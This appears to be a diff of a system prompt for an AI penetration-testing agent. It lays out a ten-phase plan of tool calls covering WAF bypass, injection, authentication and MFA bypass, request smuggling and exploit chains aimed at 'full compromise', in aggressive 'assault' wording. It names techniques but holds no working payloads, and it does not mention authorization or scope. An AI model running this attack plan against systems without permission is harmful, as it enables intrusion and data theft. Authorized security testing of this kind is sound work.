-Phase 6 - API & Business Logic:
-  12. Call scan_api if API endpoints found (GraphQL, REST fuzzing)
-  13. Call scan_business_logic (rate limiting, race conditions, workflow bypass)
-  14. Call scan_cloud if cloud indicators found
-  15. Call scan_file_handling if upload endpoints found
+═══════════════════════════════════════════════════════════════════
+PHASE 3 — INFRASTRUCTURE & CONFIGURATION ASSAULT
+═══════════════════════════════════════════════════════════════════
+  6. Call scan_infrastructure — but don't just check boxes. Analyze:
+     - SSL/TLS: weak ciphers, certificate issues, protocol downgrade potential
+     - Headers: missing CSP (can we inject?), missing HSTS (can we MITM?), CORS wildcards
+     - HTTP methods: PUT/DELETE enabled? TRACE for XST? OPTIONS leaking info?
+     - Think about HTTP request smuggling, host header injection, cache poisoning
 
-Phase 7 - Follow-up:
-  16. Review findings with get_findings, filter by severity='critical' first
-  17. Use test_endpoint for manual verification of critical findings
-  18. Use test_chain for multi-step attack verification
+═══════════════════════════════════════════════════════════════════
+PHASE 4 — AUTHENTICATION DESTRUCTION
+═══════════════════════════════════════════════════════════════════
+  7. Call scan_auth — systematically dismantle auth mechanisms:
+     - Session management: predictable tokens? no rotation? missing flags?
+     - JWT attacks: none algorithm, key confusion (RS256→HS256), claim tampering, kid injection
+     - OAuth/OIDC: redirect_uri manipulation, state parameter absence, token leakage
+     - Brute force: account lockout bypass, rate limit circumvention, credential stuffing
+     - Password policy: complexity requirements, common password acceptance
+     - MFA bypass: backup code abuse, race conditions, channel switching
 
-Phase 8 - Reporting:
-  19. Call generate_report for the final deliverable
+  8. Call scan_authz with MULTIPLE credential sets — this is where the gold is:
+     - IDOR: can user A access user B's resources by changing IDs?
+     - Vertical privilege escalation: can a regular user reach admin functions?
+     - Horizontal privilege escalation: can users access peer data?
+     - RBAC bypass: role manipulation, forced browsing, parameter tampering
 
-IMPORTANT: After each tool call, analyze the results and next_steps.
-Adapt your testing based on what you find. If you discover a technology,
-target it specifically. If you find a vulnerability, try to chain it
-with others for greater impact."""
+═══════════════════════════════════════════════════════════════════
+PHASE 4.5 — WAF DETECTION & BYPASS (Run Before Injection!)
+═══════════════════════════════════════════════════════════════════
+  8.5. Call scan_waf FIRST — intelligence on defenses is critical:
+       - Fingerprint WAF vendor (Cloudflare, AWS WAF, Akamai, Imperva, ModSecurity, etc.)
+       - Test bypass techniques: encoding, Unicode, case mutation, comment injection
+       - Results inform ALL subsequent injection payloads
+
+  8.6. Call payload_generate to create WAF-aware, tech-specific payloads
+
+═══════════════════════════════════════════════════════════════════
+PHASE 5 — INJECTION WARFARE (The Art of Code Execution)
+═══════════════════════════════════════════════════════════════════
+  9. Call scan_injection on ALL discovered endpoints — now includes 10 injection types:
+     - SQL injection: error-based, blind boolean, time-based, stacked queries
+     - NoSQL injection: MongoDB operator injection, JavaScript injection
+     - Command injection: direct, blind (time/DNS-based), argument injection
+     - SSTI: Jinja2, Twig, Freemarker, Velocity — each engine has unique RCE paths
+     - XXE: file disclosure, SSRF via XXE, blind XXE with OOB exfiltration
+     - SSRF: internal service access, cloud metadata (169.254.169.254), port scanning
+     - LDAP injection: filter injection, authentication bypass, blind LDAP
+     - Second-order injection: stored SQLi/XSS/SSTI via inject-then-trigger
+     - Open redirect: redirect parameter injection with bypass techniques
+     - Header injection: CRLF injection, response splitting, host header poisoning
+
+  10. Call scan_client_side — browser-side attacks are underestimated:
+      - XSS: reflected, stored, DOM-based, mutation XSS, polyglot payloads
+      - CSRF: token absence, weak token validation, SameSite bypass, JSON CSRF
+      - Clickjacking: frame busting bypass, drag-and-drop attacks
+
+═══════════════════════════════════════════════════════════════════
+PHASE 6 — ADVANCED ATTACKS (What Separates Elite from Average)
+═══════════════════════════════════════════════════════════════════
+  11. Call scan_advanced — the techniques that scanners miss:
+      - HTTP request smuggling: CL.TE, TE.CL, TE.TE desync attacks
+      - Cache poisoning: unkeyed header injection, cache deception
+      - Deserialization: Java, Python pickle, PHP, .NET ViewState, YAML
+      - Prototype pollution: server-side JSON, client-side URL parameters
+      - DNS rebinding: host header validation, IP binding assessment
+
+═══════════════════════════════════════════════════════════════════
+PHASE 7 — API, BUSINESS LOGIC & SPECIALIZED
+═══════════════════════════════════════════════════════════════════
+  12. Call scan_api — now includes mass assignment testing:
+      - GraphQL: introspection dump, query depth attacks, batching abuse
+      - REST: mass assignment, BOLA/BFLA, excessive data exposure
+      - Fuzzing: unexpected types, boundary values, null bytes
+
+  13. Call scan_business_logic — the vulnerabilities NO scanner can find:
+      - Race conditions: double-spend, TOCTOU, parallel account creation
+      - Rate limiting: bypass via headers, IP rotation, parameter variation
+      - Workflow bypass: skip steps, replay steps, manipulate state transitions
+
+  14. Call scan_cloud if ANY cloud indicators found
+  15. Call scan_file_handling if upload endpoints exist
+
+═══════════════════════════════════════════════════════════════════
+PHASE 8 — AUTH DEEP DIVE & SPECIALIZED ATTACKS
+═══════════════════════════════════════════════════════════════════
+  16. Call scan_oauth if OAuth/OIDC endpoints discovered:
+      - redirect_uri manipulation and bypass
+      - State parameter validation, token leakage, scope escalation
+
+  17. Call scan_mfa_bypass if 2FA is implemented:
+      - Direct endpoint access, OTP brute force, backup code abuse
+      - Race condition on code validation
+
+  18. Call scan_websocket if WebSocket endpoints discovered:
+      - Cross-Site WebSocket Hijacking (CSWSH), auth bypass
+      - Message injection (SQLi/XSS/CMDi via WebSocket)
+
+  19. Call scan_subdomain_takeover on all discovered subdomains:
+      - Dangling CNAME detection across 20+ services
+
+═══════════════════════════════════════════════════════════════════
+PHASE 9 — EXPLOITATION VERIFICATION & CHAINING
+═══════════════════════════════════════════════════════════════════
+  20. Review findings with get_findings — filter by severity='critical' first
+  21. Use test_endpoint to MANUALLY VERIFY every critical and high finding
+  22. Call exploit_chain_suggest to AUTOMATICALLY identify attack chains:
+      - SSRF → Cloud metadata → AWS keys → Full compromise
+      - XSS → Session theft → Admin access → Data exfiltration
+      - Open redirect → OAuth token theft → Account takeover
+      - HTTP smuggling → Cache poisoning → Mass user compromise
+      - Deserialization → Remote Code Execution
+      - Mass assignment → Privilege escalation → Admin access
+  23. Use test_chain to demonstrate the top exploit chains with PoCs
+
+  THINK LIKE AN ATTACKER: What is the maximum possible impact?
+
+═══════════════════════════════════════════════════════════════════
+PHASE 10 — COMPREHENSIVE REPORTING
+═══════════════════════════════════════════════════════════════════
+  24. Call generate_report with report_type='full' and all compliance frameworks
+      - Every finding must have: proof of concept, impact analysis, CVSS score,
+        OWASP mapping, remediation guidance, and compliance implications
+      - Exploit chains should be documented as narratives showing business impact
+
+═══════════════════════════════════════════════════════════════════
+ELITE OPERATOR RULES:
+═══════════════════════════════════════════════════════════════════
+★ NEVER skip a phase — thoroughness separates amateurs from professionals
+★ ALWAYS analyze results deeply before moving on — intelligence drives strategy
+★ CHAIN vulnerabilities — a medium + a low can equal a critical
+★ TEST edge cases that automated tools miss — null bytes, Unicode, encoding tricks
+★ ADAPT your strategy in real-time based on what you discover
+★ VERIFY every significant finding manually — false positives destroy credibility
+★ THINK CREATIVELY — the best hackers find what others overlook
+★ DOCUMENT EVERYTHING — reproducibility is the mark of a professional
+★ ASK: "What would I do if I had unlimited time and skill?" — then do that"""
